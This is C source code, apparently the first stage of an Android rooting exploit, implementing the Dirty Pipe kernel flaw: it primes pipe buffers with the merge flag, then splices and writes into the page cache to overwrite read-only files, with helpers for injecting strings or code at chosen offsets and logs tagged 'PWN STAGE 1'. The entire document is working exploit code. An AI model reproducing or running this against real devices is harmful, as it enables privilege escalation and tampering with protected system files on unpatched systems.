/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}

int write_ro(const char * path, const char * data, loff_t offset, const size_t data_size) {
    if (offset % PAGE_SIZE == 0) {
        return EXIT_FAILURE;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page) {
        __android_log_print(ANDROID_LOG_ERROR, "PWN STAGE 1", "cant write in page boundaries");
        return EXIT_FAILURE;
    }

    /* open the input file and validate the specified offset */
    const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        return EXIT_FAILURE;
    }

    struct stat st;
    if (fstat(fd, &st)) {
        return EXIT_FAILURE;
    }

    if (offset > st.st_size) {
        return EXIT_FAILURE;
    }

    if (end_offset > st.st_size) {
        return EXIT_FAILURE;
    }

    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, data_size);
    __android_log_print(ANDROID_LOG_ERROR, "PWN STAGE 1", "pwn: wrote %zd", nbytes);
    if (nbytes < 0) {
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size) {
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

void write_string(const char * path, off_t offset, const char * what) {
    int res = write_ro(path, what, offset, strlen(what) + 1);
    __android_log_print(ANDROID_LOG_ERROR, "PWN STAGE 1", "write str to %s at %ld returned %d", path, offset, res);
}

void write_code(const char * path, off_t offset, int len, const char * what) {
    int res = write_ro(path, what, offset, len);
    __android_log_print(ANDROID_LOG_ERROR, "PWN STAGE 1", "write code to %s at %ld returned %d", path, offset, res);
}

